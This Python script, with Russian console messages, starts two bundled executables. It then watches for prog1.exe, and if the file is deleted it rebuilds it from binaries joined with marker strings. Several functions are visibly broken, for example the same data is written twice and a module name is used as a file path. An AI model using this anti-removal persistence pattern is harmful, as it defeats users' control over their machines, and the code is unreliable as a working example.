import os
import sys
import traceback
from time import sleep, time

import psutil

FILE = 'prog1.exe'


def resource_path(relative):
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, relative)
    else:
        return os.path.join(os.path.abspath("."), relative)


def timeout():
    sleep(3)
    print("Подождал 3 сек")
    return True


def write_data(file_name, data1, data2, name1, name2):
    with open(file_name, 'bw') as f:
        f.write(data1)  # first file

        towrite = 'eof1'.encode('utf-8') + name1.encode('utf-8')
        f.write(bytes(towrite))
        f.write(data1)  # second file

        towrite = 'eof2'.encode('utf-8') + name2.encode('utf-8')
        f.write(bytes(towrite))
        f.write(data2)  # third file


def stick_files(file1, file2, FILENAME_STICK):
    with open(file1, 'rb') as f:
        file = f.read()

    with open(file2, 'rb') as f:
        file_add = f.read()
    print(file1[-5])
    print(file2[-5])
    write_data(FILENAME_STICK, file, file_add, file1[-5], file2[-5])


def unstick_files(FILENAME_STICK_):
    with open(FILENAME_STICK_, 'rb') as f:
        stick = f.read()

    eof1 = stick.find(bytes('eof1'.encode('utf-8')))
    eof2 = stick.find(bytes('eof2'.encode('utf-8')))
    file_name1 = 'temp' + chr(int(stick[eof1 + 4])) + '.exe'
    file_name2 = 'prog' + chr(int(stick[eof2 + 4])) + '.exe'
    print(file_name1)
    print(file_name2)
    print('index eof1: ' + str(eof1))
    print('index eof2: ' + str(eof2))

    file1 = stick[eof1+5:eof2]
    file2 = stick[eof2+5:]

    with open(file_name1, 'wb') as f:
        f.write(file1)
    with open(file_name2, 'wb') as f:
        f.write(file2)

    stick_files(file_name2, file_name1, file_name2)
    os.remove(file_name1)


def exist_process():
    start_time = time()
    for num, proc in enumerate(psutil.process_iter()):
        if proc.name() == FILE:
            print("Время на поиск процесса {}".format(time() - start_time))
            return True
    print("Время на поиск процесса {}".format(time() - start_time))
    return False


def exist_file():
    return os.path.exists(FILE)


def restore_process():
    print("Процесс {} восстановлен".format(FILE))


def restore_file():
    unstick_files(__name__)
    print("Файл {} восстановлен".format(FILE))


def main():
    print("Start")
    try:
        os.system('start {}'.format(resource_path("tmp.exe")))
    except:
        traceback.print_exc()

    try:
        os.system('start {}'.format(resource_path("tmp2.exe")))
    except:
        traceback.print_exc()

    while timeout():
        if not exist_file():
            print("Файл {} удален".format(FILE))
            restore_file()
        if not exist_process():
            print("Процесс {} удален".format(FILE))
            restore_process()


if __name__ == '__main__':
    main()
